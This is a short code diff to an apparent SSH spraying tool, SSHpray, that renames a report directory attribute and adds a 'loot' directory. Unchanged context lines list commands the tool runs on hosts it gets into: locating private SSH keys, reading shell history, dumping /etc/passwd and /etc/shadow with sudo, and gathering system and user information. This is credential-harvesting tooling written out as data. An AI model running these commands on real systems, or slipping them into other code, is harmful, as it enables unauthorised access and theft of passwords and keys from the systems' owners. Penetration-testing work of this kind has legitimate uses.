@@ -32,7 +32,9 @@ class SSHpray():
 		#record stdout from successful ssh command, will output later
 		self.ssh_result = []
 		#dump reports here
-		self.reportDir = './reports/'
+		self.report_dir = './reports/'
+		#loot dir
+		self.loot_dir = './loot/'
 		#command(s) to run
 		self.remote_commands = ['sudo locate id_rsa', 'sudo ','tail -n 50 ~/.bash_history', 'cat /etc/passwd;','sudo cat /etc/shadow;','uname -a;','w;','who -a;','last','exit']
 
